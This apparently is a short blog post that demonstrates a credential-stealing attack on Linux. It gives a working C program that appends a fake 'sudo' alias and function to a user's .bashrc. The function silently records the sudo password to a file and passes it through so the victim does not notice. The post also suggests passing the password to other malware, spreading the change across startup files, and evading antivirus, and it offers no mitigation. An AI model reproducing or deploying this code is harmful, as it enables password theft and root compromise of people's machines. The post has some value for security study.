---
title: Bash aliases can be dangerous! A demonstration
date: 2023-02-12 09:20:21
tags: cybersecurity, linux, bash
---
Consider the file `.bashrc`. Normally, it's permissions are set as thus:
```-rw-r--r-- 1 ghostdog ghostdog 913 Feb 12 07:55 .bashrc```
Decoding this, means:
Owner can write (so our default user)
Everyone else can only read

So what would happen if we ran a malicious application that affects our bashrc file?
Consider the following simple C program:
```c
#include <stdio.h> 


int main(int argc, char const *argv[])
{

	FILE *fp;
	char *filename = "/home/ghostdog/.bashrc";
	char* stealer = "alias sudo=\'fakesudo\'\nfunction fakesudo (){\n    read -sp \"[sudo] password for ${USER}: \" pass;\n    cat <<< $pass > yourpassword.txt; \n    out=`\\sudo -p \"\" -S <<< $pass $@` \n    printf \"\\n${out}\\n\"; \n}";


	fp = fopen(filename, "a");

	fprintf(fp, "%s\n", stealer);
	fclose(fp);

	return 0;
}
```

Which writes the following to our bashrc (commends added for clarity):
```bash
alias sudo='fakesudo'
function fakesudo (){
    read -sp "[sudo] password for ${USER}: " pass; # read our passwd
    #cat <<< $pass > yourpassword.txt; # Output our grabbed passwd to a file
    
    out=`\sudo -p "" -S <<< $pass $@` # here we use a backslash to avoid recursively calling our own function, and the <<< as a 'here' string for
                                # our grabbed passwd, as well as our function args using $@ to grab all of them
                                # we also add the `-p ""` option as to avoid giving the prompt twice, which would give us away
    


    printf "\n${out}\n"; # here we use printf to avoid dealing with echo's inconsistancy, and insert newlines to make the output look normal
}

```

When the victim runs ANY command that involves the standard util `sudo`, it will now record their password to the file `yourpassword.txt` in the current working directory. If desired, you could clearly do much more than just simply write the password, like passing this root level access to your malicious executable. E.g:
```bash
/bin/mymalware "--root-password=${pass}"
```
or similar. 

If we were being really nasty, we could even write the change to multiple bash startup files, as bash does not check the .bashrc file for non login shells. 
![Tables of what files bash checks on startup, archwiki](/images/bash_files.png)
###### Image credit: ArchWiki, Table colours added by user Alad on 16 Aug 2015, oldid=391339. Initial table also by Alad, oldid=335790. 

This method of exploitation, as far as i am aware, has not been exploited, despite wide access to the bashrc file being common for default installations (it would be interesting to see if openbsd fixed this years ago, which I heavily suspect to be the case). And while users *could* just use `\sudo` every single time, I doubt anybody is doing that!
The advantage of this method, over something like replacing a binary, is that it is using *expected and normal tools*, thus it is very unlikely to trip an anti-virus or set off any red flags should someone hash their binaries to check them. 

Mitigation of this is left as an exercise for the reader ;-)